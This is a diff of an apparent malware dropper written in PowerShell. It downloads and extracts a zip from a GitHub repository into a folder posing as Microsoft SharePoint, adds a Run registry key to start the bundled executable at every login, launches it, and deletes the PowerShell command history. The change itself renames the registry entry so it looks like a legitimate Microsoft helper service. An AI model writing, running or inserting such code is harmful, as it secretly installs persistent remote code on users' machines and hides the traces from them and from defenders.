@@ -14,7 +14,7 @@ New-Item -ItemType "directory" -Path "C:/Users/$env:USERNAME/AppData/Roaming/Mic
 Invoke-WebRequest -Uri "https://github.com/DanielAckermann69/SharePoint/archive/refs/heads/main.zip" -OutFile "C:/Users/$env:USERNAME/AppData/Roaming/Microsoft/SharePoint/v2.zip"
 Expand-Archive -Path "C:/Users/$env:USERNAME/AppData/Roaming/Microsoft/SharePoint/v2.zip" -DestinationPath "C:/Users/$env:USERNAME/AppData/Roaming/Microsoft/SharePoint"
 
-New-ItemProperty -Path HKCU:/Software/Microsoft/Windows/CurrentVersion/Run -Name "SharePoint-47582i86" -Value "C:\Users\$env:USERNAME\AppData\Roaming\Microsoft\SharePoint\SharePoint-main\Microsoft-SharePoint-Helper-Service.exe" -PropertyType String
+New-ItemProperty -Path HKCU:/Software/Microsoft/Windows/CurrentVersion/Run -Name "Microsoft-SharePoint-Helper-Service" -Value "C:\Users\$env:USERNAME\AppData\Roaming\Microsoft\SharePoint\SharePoint-main\Microsoft-SharePoint-Helper-Service.exe" -PropertyType String
 start "C:/Users/$env:USERNAME/AppData/Roaming/Microsoft/SharePoint/SharePoint-main/Microsoft-SharePoint-Helper-Service.exe"
 
 Remove-Item (Get-PSReadlineOption).HistorySavePath
